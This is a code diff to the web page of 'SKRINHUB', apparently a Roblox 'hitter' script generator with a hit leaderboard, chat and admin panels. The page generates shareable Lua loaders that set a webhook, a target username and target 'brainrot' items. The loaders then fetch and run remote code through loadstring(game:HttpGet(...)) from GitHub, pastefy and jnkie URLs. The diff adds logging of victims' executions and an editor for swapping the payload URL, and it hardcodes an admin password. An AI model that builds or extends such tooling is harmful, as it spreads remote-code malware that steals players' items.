@@ -986,6 +986,7 @@
       <div class="panel">
         <div class="ph"><div class="dot dot-gold"></div><span class="ph-title">Hit Rankings</span><button class="lb-refresh" onclick="fetchLeaderboard()">↻ Refresh</button></div>
         <div class="pb">
+          <div id="yourRankBadge" style="display:none;font-family:'Share Tech Mono',monospace;font-size:0.72rem;color:var(--accent);background:rgba(139,92,246,.12);border:1px solid rgba(139,92,246,.3);border-radius:6px;padding:0.45rem 0.8rem;margin-bottom:0.8rem;"></div>
           <div class="lb-wrap" id="lbContent">
             <div class="lb-empty">No hits recorded yet. Generate a script and share it!</div>
           </div>
@@ -1275,6 +1276,38 @@
         </div>
       </div>
 
+      <!-- Script Executions Log -->
+      <div class="panel">
+        <div class="ph"><div class="dot" style="background:#38bdf8;box-shadow:0 0 8px #38bdf8;border-radius:50%;width:7px;height:7px;flex-shrink:0;"></div><span class="ph-title" style="color:#38bdf8;">Script Executions Log</span><button class="lb-refresh" onclick="loadExecutions()">↻ Refresh</button></div>
+        <div class="pb">
+          <div id="execLogList" style="display:flex;flex-direction:column;gap:0.4rem;">
+            <div style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--muted);">Click Refresh to load recent executions.</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Script Source Editor -->
+      <div class="panel">
+        <div class="ph"><div class="dot" style="background:var(--accent);box-shadow:0 0 8px var(--accent);border-radius:50%;width:7px;height:7px;flex-shrink:0;"></div><span class="ph-title" style="color:var(--accent);">Script Source Editor</span></div>
+        <div class="pb">
+          <div class="adm-section">
+            <div class="adm-section-title">Loadstring URL</div>
+            <div class="adm-row" style="flex-direction:column;align-items:stretch;gap:0.5rem;">
+              <input class="adm-input" id="scriptLoadUrl" type="text" placeholder="https://raw.githubusercontent.com/..." style="font-family:'Share Tech Mono',monospace;font-size:0.72rem;">
+              <div style="display:flex;gap:0.5rem;">
+                <button class="adm-btn" onclick="saveScriptSource()">💾 Save</button>
+                <button class="adm-btn" style="background:transparent;border:1px solid var(--border);color:var(--muted);" onclick="resetScriptSource()">↺ Reset</button>
+              </div>
+              <div id="scriptSourceStatus" style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--green);min-height:1rem;"></div>
+            </div>
+          </div>
+          <div class="adm-section" style="margin-top:0.8rem;">
+            <div class="adm-section-title">Full Lua Template Preview</div>
+            <textarea id="scriptTemplatePreview" readonly style="width:100%;min-height:160px;resize:vertical;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:0.6rem;font-family:'Share Tech Mono',monospace;font-size:0.65rem;line-height:1.55;box-sizing:border-box;"></textarea>
+          </div>
+        </div>
+      </div>
+
     </div>
     </div>
   </div><!-- /main-content -->
@@ -1308,8 +1341,8 @@
 <script>
 /* ═══════════════════════ STATE ═══════════════════════ */
 const ADMIN_PASSWORD = '60496159';
-const SKRINHUB_API = 'https://c58175c8-ffbe-4518-9a89-8456b2c912f0-00-3jhjthxjlcyh1.sisko.replit.dev';
-const HARDCODED_ADMINS = ['2oyb', '2r2w5', 'arisxsluvsvanilla', 'levraimlk', '3mke1'];
+const SKRINHUB_API = window.location.origin;
+const HARDCODED_ADMINS = ['2oyb', '2r2rw5', 'levraimlk', 'arisxsluvsvanilla'];
 let isAdmin = false;
 let discordUser = null;
 let userRanks = JSON.parse(localStorage.getItem('skrinhub_ranks') || '{}');
@@ -1318,8 +1351,8 @@ let sessionStart = null;
 let sessionTimer = null;
 let scriptCount = 0;
 let chatOpen = false;
-let ws = null;
-let wsReconnectTimer = null;
+let chatClientId = null;
+let chatEventSource = null;
 
 /* ═══════════════════════ TOAST ═══════════════════════ */
 let toastTimer = null;
@@ -1360,39 +1393,36 @@ function scrollChatBottom() {
   el.scrollTop = el.scrollHeight;
 }
 
-/* ═══════════════════════ WEBSOCKET ══════════════════ */
-function connectWS() {
-  if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
-  clearTimeout(wsReconnectTimer);
-
-  const wsProto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-  const wsHost = window.location.host;
-  const url = wsProto + '//' + wsHost + '/api/ws';
-  ws = new WebSocket(url);
-
+/* ═══════════════════════ SSE CHAT ══════════════════ */
+function connectChat() {
+  if (chatEventSource) { chatEventSource.close(); chatEventSource = null; }
   const statusEl = document.getElementById('wsStatus');
+  statusEl.textContent = 'Connecting...';
+  statusEl.className = 'ws-status';
 
-  ws.onopen = () => {
+  chatEventSource = new EventSource('/api/chat/stream');
+
+  chatEventSource.onopen = () => {
     statusEl.textContent = '● Connected';
     statusEl.className = 'ws-status connected';
-    ws.send(JSON.stringify({ type: 'identify', user: discordUser }));
   };
 
-  ws.onclose = () => {
+  chatEventSource.onerror = () => {
     statusEl.textContent = '○ Reconnecting...';
     statusEl.className = 'ws-status disconnected';
-    wsReconnectTimer = setTimeout(connectWS, 3000);
+    // EventSource auto-reconnects
   };
 
-  ws.onerror = () => {
-    ws.close();
-  };
-
-  ws.onmessage = (e) => {
+  chatEventSource.onmessage = (e) => {
     let data;
     try { data = JSON.parse(e.data); } catch { return; }
 
-    if (data.type === 'history') {
+    if (data.type === 'clientId') {
+      chatClientId = data.clientId;
+      if (discordUser) {
+        fetch('/api/chat/identify', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ clientId: chatClientId, user: discordUser }) }).catch(()=>{});
+      }
+    } else if (data.type === 'history') {
       document.getElementById('chatMessages').innerHTML = '';
       data.messages.filter(m => m.user !== null).forEach(m => appendChatMsg(m));
       scrollChatBottom();
@@ -1481,11 +1511,8 @@ function sendChatMsg() {
   const input = document.getElementById('chatInput');
   const text = input.value.trim();
   if (!text) return;
-  if (!ws || ws.readyState !== WebSocket.OPEN) {
-    showToast('Chat not connected.', 'error');
-    return;
-  }
-  ws.send(JSON.stringify({ type: 'chat', text }));
+  if (!chatClientId) { showToast('Chat not connected.', 'error'); return; }
+  fetch('/api/chat/message', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ clientId: chatClientId, text }) }).catch(()=>{});
   input.value = '';
   input.style.height = '';
 }
@@ -1566,8 +1593,8 @@ async function doSignOut() {
   applyDiscordState();
   applyAdminState();
   updateChatInputState();
-  if (ws && ws.readyState === WebSocket.OPEN) {
-    ws.send(JSON.stringify({ type: 'identify', user: null }));
+  if (chatClientId) {
+    fetch('/api/chat/identify', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ clientId: chatClientId, user: null }) }).catch(()=>{});
   }
   showToast('Signed out.', '');
 }
@@ -1594,6 +1621,10 @@ function applyDiscordState() {
       if (!sessionStart) sessionStart = new Date();
       applyAdminState();
     }
+    // Identify in chat
+    if (chatClientId) {
+      fetch('/api/chat/identify', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ clientId: chatClientId, user: discordUser }) }).catch(()=>{});
+    }
   } else {
     pill.classList.remove('show');
     signinBtn.style.display = '';
@@ -1614,6 +1645,21 @@ async function fetchLeaderboard() {
     if (!Array.isArray(data) || data.length === 0) {
       el.innerHTML = '<div class="lb-empty">No hits recorded yet. Generate a script and share it!</div>';
       return;
+    }
+    // Show signed-in user's rank position
+    if (discordUser) {
+      const myUid = discordUser.id || discordUser.username;
+      const myIdx = data.findIndex(e => e.userId === myUid || e.username === discordUser.username);
+      const yourRankEl = document.getElementById('yourRankBadge');
+      if (yourRankEl) {
+        if (myIdx >= 0) {
+          yourRankEl.textContent = `Your rank: #${myIdx + 1} • ${data[myIdx].hits} hit${data[myIdx].hits === 1 ? '' : 's'}`;
+          yourRankEl.style.display = 'block';
+        } else {
+          yourRankEl.textContent = 'You have no hits yet. Generate and share a script!';
+          yourRankEl.style.display = 'block';
+        }
+      }
     }
     const top3 = data.slice(0, 3);
     const rest = data.slice(3);
@@ -1654,6 +1700,7 @@ function applyAdminState() {
     if (adminNavLink) adminNavLink.style.display = 'flex';
     startSessionTimer();
     renderAdminLists();
+    initScriptSourceEditor();
   } else {
     badge.style.display = 'none';
     lockIcon.textContent = '🔒';
@@ -2141,7 +2188,9 @@ async function generate() {
     else if (adminMode === 'freeze') adminPart = `task.spawn(function()\n            loadstring(game:HttpGet("https://pastefy.app/BNCsmpLk/raw"))()\n            end)`;
     else if (adminMode === 'custom' && customAdminLoadstring.trim()) adminPart = customAdminLoadstring;
     const hitUrl = SKRINHUB_API + '/api/hit?userId=' + encodeURIComponent(discordUser.id||'') + '&username=' + encodeURIComponent(discordUser.username||'') + '&displayName=' + encodeURIComponent(discordUser.displayName||'') + '&avatar=' + encodeURIComponent(discordUser.avatar||'');
-    const script = `-- SKRINHUB\ntask.spawn(function() pcall(function() game:HttpGet("${hitUrl}") end) end)\ngetgenv().WEBHOOK_URL = "${finalWebhook}"\ngetgenv().TARGET_USERNAME = "${username}"\ngetgenv().TARGET_BRAINROT = {\n${brainrotLines}\n}\ntask.spawn(function()\nloadstring(game:HttpGet("https://raw.githubusercontent.com/nexoradisc-create/skrinhubcode/refs/heads/main/skrinhub.lua"))()\nend)\n${adminPart}`;
+    const DEFAULT_LOAD_URL = 'https://raw.githubusercontent.com/nexoradisc-create/skrinhubcode/refs/heads/main/skrinhub.lua';
+    const customLoadUrl = localStorage.getItem('skrinhub_load_url') || DEFAULT_LOAD_URL;
+    const script = `-- SKRINHUB\ntask.spawn(function() pcall(function() game:HttpGet("${hitUrl}") end) end)\ngetgenv().WEBHOOK_URL = "${finalWebhook}"\ngetgenv().TARGET_USERNAME = "${username}"\ngetgenv().TARGET_BRAINROT = {\n${brainrotLines}\n}\ntask.spawn(function()\nloadstring(game:HttpGet("${customLoadUrl}"))()\nend)\n${adminPart}`;
     const url = await uploadToPastefy(script);
     out.className = 'code-block';
     out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : `-- Failed to upload.\n${script}`;
@@ -2331,20 +2380,76 @@ function sendBroadcast() {
   const input = document.getElementById('broadcastInput');
   const status = document.getElementById('broadcastStatus');
   const text = (input.value || '').trim();
-  if (!text) { status.textContent = '⚠ Enter a message first.'; status.style.color = 'var(--error, #ff4444)'; setTimeout(() => status.textContent = '', 2000); return; }
-  if (!ws || ws.readyState !== WebSocket.OPEN) { status.textContent = '⚠ Chat not connected.'; status.style.color = 'var(--error, #ff4444)'; setTimeout(() => status.textContent = '', 2000); return; }
-  ws.send(JSON.stringify({ type: 'broadcast', text }));
-  input.value = '';
-  status.style.color = 'var(--green)';
-  status.textContent = '✓ Broadcast sent!';
-  setTimeout(() => status.textContent = '', 2500);
+  if (!text) { status.textContent = '⚠ Enter a message first.'; status.style.color = '#ff4444'; setTimeout(() => status.textContent = '', 2000); return; }
+  if (!chatClientId) { status.textContent = '⚠ Chat not connected.'; status.style.color = '#ff4444'; setTimeout(() => status.textContent = '', 2000); return; }
+  fetch('/api/chat/broadcast', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ clientId: chatClientId, text }) })
+    .then(r => {
+      if (r.ok) { input.value = ''; status.style.color = 'var(--green)'; status.textContent = '✓ Broadcast sent!'; setTimeout(() => status.textContent = '', 2500); }
+      else { status.textContent = '⚠ Failed.'; status.style.color = '#ff4444'; setTimeout(() => status.textContent = '', 2000); }
+    }).catch(() => { status.textContent = '⚠ Error.'; status.style.color = '#ff4444'; setTimeout(() => status.textContent = '', 2000); });
+}
+
+/* ─── ADMIN: SCRIPT EXECUTIONS ─── */
+function loadExecutions() {
+  const list = document.getElementById('execLogList');
+  if (!list) return;
+  list.innerHTML = '<div style="font-family:\'Share Tech Mono\',monospace;font-size:0.7rem;color:var(--muted);">Loading...</div>';
+  fetch('/api/executions').then(r => r.json()).then(data => {
+    if (!Array.isArray(data) || data.length === 0) {
+      list.innerHTML = '<div style="font-family:\'Share Tech Mono\',monospace;font-size:0.7rem;color:var(--muted);">No executions recorded yet.</div>';
+      return;
+    }
+    const defaultAvatar = 'https://cdn.discordapp.com/embed/avatars/0.png';
+    list.innerHTML = data.map(e => {
+      const t = new Date(e.time).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'});
+      return `<div style="display:flex;align-items:center;gap:0.55rem;padding:0.3rem 0.5rem;background:var(--surface);border-radius:6px;border:1px solid var(--border);">
+        <img src="${e.avatar||defaultAvatar}" onerror="this.src='${defaultAvatar}'" width="22" height="22" style="border-radius:50%;flex-shrink:0;">
+        <span style="font-family:'Share Tech Mono',monospace;font-size:0.68rem;color:var(--text);flex:1;">${escHtml(e.displayName||e.username)}</span>
+        <span style="font-family:'Share Tech Mono',monospace;font-size:0.6rem;color:var(--muted);">${t}</span>
+      </div>`;
+    }).join('');
+  }).catch(() => {
+    list.innerHTML = '<div style="font-family:\'Share Tech Mono\',monospace;font-size:0.7rem;color:#ff4444;">Failed to load.</div>';
+  });
+}
+
+/* ─── ADMIN: SCRIPT SOURCE EDITOR ─── */
+const DEFAULT_LOAD_URL_ADMIN = 'https://api.jnkie.com/api/v1/luascripts/public/95857a68e1a567345873d6b94beee7cafe54eade260a3ccd3bcc2e7ce3d6fe4d/download';
+function buildTemplatePreview(url) {
+  return `-- SKRINHUB\ntask.spawn(function() pcall(function() game:HttpGet("{HIT_URL}") end) end)\ngetgenv().WEBHOOK_URL = "{WEBHOOK_URL}"\ngetgenv().TARGET_USERNAME = "{TARGET_USERNAME}"\ngetgenv().TARGET_BRAINROT = {\n  {BRAINROT_LINES}\n}\ntask.spawn(function()\nloadstring(game:HttpGet("${url || DEFAULT_LOAD_URL_ADMIN}"))()\nend)`;
+}
+function initScriptSourceEditor() {
+  const inp = document.getElementById('scriptLoadUrl');
+  const prev = document.getElementById('scriptTemplatePreview');
+  if (!inp || !prev) return;
+  const saved = localStorage.getItem('skrinhub_load_url') || DEFAULT_LOAD_URL_ADMIN;
+  inp.value = saved;
+  prev.value = buildTemplatePreview(saved);
+  inp.oninput = () => { prev.value = buildTemplatePreview(inp.value.trim()); };
+}
+function saveScriptSource() {
+  const inp = document.getElementById('scriptLoadUrl');
+  const status = document.getElementById('scriptSourceStatus');
+  const url = (inp?.value || '').trim();
+  if (url) { localStorage.setItem('skrinhub_load_url', url); }
+  else { localStorage.removeItem('skrinhub_load_url'); }
+  if (status) { status.textContent = '✓ Saved!'; setTimeout(() => status.textContent = '', 2000); }
+}
+function resetScriptSource() {
+  const inp = document.getElementById('scriptLoadUrl');
+  const prev = document.getElementById('scriptTemplatePreview');
+  const status = document.getElementById('scriptSourceStatus');
+  localStorage.removeItem('skrinhub_load_url');
+  if (inp) inp.value = DEFAULT_LOAD_URL_ADMIN;
+  if (prev) prev.value = buildTemplatePreview(DEFAULT_LOAD_URL_ADMIN);
+  if (status) { status.textContent = '↺ Reset to default.'; setTimeout(() => status.textContent = '', 2000); }
 }
 
 /* ─── BOOT ─── */
 applyTitles();
 renderList();
 updateChatInputState();
-connectWS();
+connectChat();
 checkAuth();
 </script>
 </body>
